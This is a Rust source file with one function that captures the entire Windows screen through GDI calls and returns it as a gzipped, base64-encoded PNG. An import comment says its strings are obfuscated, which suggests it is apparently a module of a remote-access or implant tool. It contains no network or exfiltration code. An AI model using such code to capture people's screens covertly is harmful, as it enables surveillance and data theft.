use base64::{engine::general_purpose::STANDARD, Engine as _};
use flate2::{write::GzEncoder, Compression};
use fmtools::format; // using obfstr to obfuscate
use image::codecs::png::PngEncoder;
use image::ImageEncoder;
use std::io::Write;
use std::os::raw::c_void;
use windows_sys::Win32::Foundation::HWND;
use windows_sys::Win32::Graphics::Gdi::{
    BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDC, GetDIBits,
    SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, HDC, SRCCOPY,
};
use windows_sys::Win32::UI::HiDpi::{
    SetThreadDpiAwarenessContext, DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2,
};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN,
};

pub(crate) fn screenshot() -> String {
    let mut image_data: Vec<u8>;
    let width: i32;
    let height: i32;
    let x_pos: i32;
    let y_pos: i32;

    // Use Windows API to capture image data
    unsafe {
        // Set thread DPI awareness temporarily for this function call
        let old_dpi_context =
            SetThreadDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);

        // Get the virtual screen dimensions
        // The virtual screen includes all monitors and accounts for scaling
        x_pos = GetSystemMetrics(SM_XVIRTUALSCREEN);
        y_pos = GetSystemMetrics(SM_YVIRTUALSCREEN);
        width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        let h_screen: HDC = GetDC(0 as HWND); // Get entire screen
        let h_dc: HDC = CreateCompatibleDC(h_screen);
        let h_bitmap = CreateCompatibleBitmap(h_screen, width, height);

        if h_bitmap == 0 {
            // Handle bitmap creation failure
            DeleteDC(h_dc);
            windows_sys::Win32::Graphics::Gdi::ReleaseDC(0 as HWND, h_screen);
            // Restore previous DPI awareness context
            SetThreadDpiAwarenessContext(old_dpi_context);
            return format!("Failed to create compatible bitmap");
        }

        let old_obj = SelectObject(h_dc, h_bitmap as _);

        let blit_result = BitBlt(h_dc, 0, 0, width, height, h_screen, x_pos, y_pos, SRCCOPY);

        if blit_result == 0 {
            // Handle BitBlt failure
            SelectObject(h_dc, old_obj);
            DeleteObject(h_bitmap as _);
            DeleteDC(h_dc);
            windows_sys::Win32::Graphics::Gdi::ReleaseDC(0 as HWND, h_screen);
            // Restore previous DPI awareness context
            SetThreadDpiAwarenessContext(old_dpi_context);
            return format!("Failed to capture screen with BitBlt");
        }

        let mut bitmap_info: BITMAPINFO = std::mem::zeroed();
        bitmap_info.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
        bitmap_info.bmiHeader.biWidth = width;
        bitmap_info.bmiHeader.biHeight = -height;
        bitmap_info.bmiHeader.biPlanes = 1;
        bitmap_info.bmiHeader.biBitCount = 32;
        bitmap_info.bmiHeader.biCompression = BI_RGB;

        image_data = vec![0; (width * height * 4) as usize];
        let dibits_result = GetDIBits(
            h_dc,
            h_bitmap,
            0,
            height as u32,
            image_data.as_mut_ptr().cast::<c_void>(),
            &mut bitmap_info,
            DIB_RGB_COLORS,
        );

        if dibits_result == 0 {
            // Handle GetDIBits failure
            SelectObject(h_dc, old_obj);
            DeleteObject(h_bitmap as _);
            DeleteDC(h_dc);
            windows_sys::Win32::Graphics::Gdi::ReleaseDC(0 as HWND, h_screen);
            // Restore previous DPI awareness context
            SetThreadDpiAwarenessContext(old_dpi_context);
            return format!("Failed to get bitmap data");
        }

        SelectObject(h_dc, old_obj);
        DeleteObject(h_bitmap as _);
        DeleteDC(h_dc);
        windows_sys::Win32::Graphics::Gdi::ReleaseDC(0 as HWND, h_screen);

        // Restore previous DPI awareness context
        SetThreadDpiAwarenessContext(old_dpi_context);
    }

    // Convert the image data from BGRA to RGBA
    for pixel in image_data.chunks_mut(4) {
        let (b, g, r, a) = (pixel[0], pixel[1], pixel[2], pixel[3]);
        pixel[0] = r;
        pixel[1] = g;
        pixel[2] = b;
        pixel[3] = a;
    }

    // Encode the image data as PNG
    let mut png_data = vec![];
    {
        let encoder = PngEncoder::new(&mut png_data);
        if let Err(e) = encoder.write_image(
            &image_data,
            width as u32,
            height as u32,
            image::ExtendedColorType::Rgba8,
        ) {
            return format!("Failed to encode image as PNG: "{e});
        }
    }

    // Compress the image data
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());

    if let Err(e) = encoder.write_all(&png_data) {
        return format!("Failed to compress image data: "{e});
    };

    match encoder.finish() {
        Ok(compressed_data) => {
            // Return the compressed image data as a base64 string
            STANDARD.encode(compressed_data)
        }
        Err(e) => format!("Failed to compress image data: "{e}),
    }
}
